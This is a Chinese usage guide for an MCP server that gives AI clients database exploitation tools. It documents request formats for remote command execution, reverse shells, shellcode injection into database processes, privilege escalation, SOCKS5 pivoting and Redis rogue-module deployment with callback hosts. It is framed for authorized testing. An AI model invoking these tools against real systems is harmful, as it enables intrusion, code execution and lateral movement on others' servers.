# MDUT MCP 使用指南

MDUT MCP Server 通过 Model Context Protocol 向 AI 客户端提供数据库连接、SQL、元数据和利用操作。当前共 **35 个工具**，所有利用器均复用会话级缓存；PostgreSQL 执行方式、Redis Module 状态等有状态配置会保留到后续调用。

> 仅在你有权测试的环境中使用部署、命令执行、文件写入、SOCKS5 和 Module 功能。

## 启动

STDIO 模式（默认）：

```bash
go build -tags mcp -o mdut-mcp ./cmd/mcp
./mdut-mcp
```

HTTP SSE 模式：

```bash
./mdut-mcp --http --bind 127.0.0.1 --port 16699 --token YOUR_TOKEN
```

客户端应先调用 `connect` 获取 `session_id`，后续工具复用该 ID。

## 工具清单

| 分类 | 工具 |
|---|---|
| 连接管理（5） | `list_connections`、`list_sessions`、`connect`、`disconnect`、`test_connection` |
| SQL 与元数据（6） | `sql_query`、`sql_execute`、`list_databases`、`list_tables`、`list_columns`、`get_ddl` |
| 探测、部署与清理（5） | `check_exploit_env`、`deploy_exploit`、`cleanup_exploit`、`oracle_priv_report`、`oracle_privesc` |
| 命令、文件与网络（16） | `exec_command`、`list_dir`、`read_file`、`write_file`、`delete_file`、`mk_dir`、`rename_file`、`append_file`、`read_file_chunk`、`file_size`、`hash_file`、`set_pg_exec_method`、`reverse_shell`、`exec_shellcode`、`start_socks5`、`stop_socks5` |
| Redis 专属（3） | `redis_exec`、`redis_deploy_module`、`redis_write_precise` |

## 文件操作

`write_file` 和 `append_file` 的 `base64_content` 必须是标准 Base64；handler 原样传给引擎，返回写入或追加的字节数。`read_file_chunk` 返回 Base64 片段，`offset` 是允许为 0 的非负整数，`length` 必须为正整数；小数、负数、零长度和溢出值会在调用引擎前被拒绝。

`list_dir` 支持可选 `path_charset`；`read_file` 和 `write_file` 支持可选 `path_charset`、`content_charset`。缺省均为 `utf-8`，旧调用无需修改。

```json
{"session_id":"SESSION_ID","path":"/tmp/mdut-demo"}
```

用 `mk_dir` 创建目录后，写入并追加文件：

```json
{"session_id":"SESSION_ID","path":"/tmp/mdut-demo/a.bin","base64_content":"YWJj"}
```

`append_file` 使用相同参数形式。读取第 2 个字节起的 4 字节：

```json
{"session_id":"SESSION_ID","path":"/tmp/mdut-demo/a.bin","offset":1,"length":4}
```

重命名、大小和哈希：

```json
{"session_id":"SESSION_ID","old_path":"/tmp/mdut-demo/a.bin","new_path":"/tmp/mdut-demo/b.bin"}
```

```json
{"session_id":"SESSION_ID","path":"/tmp/mdut-demo/b.bin"}
```

最后一个请求可用于 `file_size` 或 `hash_file`；分别返回字节数和 SHA256。

## PostgreSQL 执行方式

`set_pg_exec_method` 仅接受 `udf`、`copy_program`、`libc`，且只能用于 PostgreSQL 会话。方式保存在会话 exploiter 中，设置后直接调用 `exec_command`。

```json
{"session_id":"SESSION_ID","method":"copy_program"}
```

`copy_program` 使用 `COPY ... PROGRAM`，不部署 UDF；`libc` 的既有清理由对应引擎保留。其他数据库会话会返回类型错误。

## SOCKS5 认证

`start_socks5` 新增可选 `user`、`pass`。两者留空时保持原来的无认证行为。

```json
{"session_id":"SESSION_ID","bind_addr":"0.0.0.0","port":11080,"user":"proxy-user","pass":"proxy-pass"}
```

使用 `stop_socks5` 时只需 `session_id`。

## Redis Module 部署

Redis 会话调用通用 `deploy_exploit` 会转发到与 `redis_deploy_module` 相同的 Module 部署路径，不再调用通用空部署。两个工具支持同一组可选参数：

- `module_path`：Module 落地路径，留空自动生成。
- `rogue_host`、`bind_addr`：本机直连回连配置。
- `relay_addr`、`relay_rogue_host`、`relay_rogue_port`：VPS 中转配置。

```json
{"session_id":"SESSION_ID","module_path":"/tmp/system.so","rogue_host":"192.0.2.10","bind_addr":"0.0.0.0:0"}
```

Redis 专用 `redis_deploy_module` 使用相同请求体。清理仍使用 `cleanup_exploit`。

## Shellcode 行为

`exec_shellcode` 接收十六进制字符串。MSSQL/Redis 将 shellcode 注入子进程；MySQL/PostgreSQL 在数据库进程内执行，后者可能影响数据库进程稳定性。
